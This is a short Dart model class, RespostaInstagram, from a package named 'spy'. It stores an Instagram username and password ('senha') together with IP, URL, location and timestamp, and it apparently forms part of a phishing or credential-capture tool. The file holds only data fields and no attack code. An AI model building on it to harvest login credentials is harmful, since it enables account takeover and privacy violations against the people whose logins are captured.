import 'package:spy/src/shared/model/base_resposta_model.dart';

class RespostaInstagram extends BaseRespostaModel {
  String user;
  String senha;

  RespostaInstagram({
    String? ip,
    String? url,
    required this.user,
    required this.senha,
    required String local,
    required DateTime date,
  }) : super(ip: ip, local: local, url: url, date: date);
}
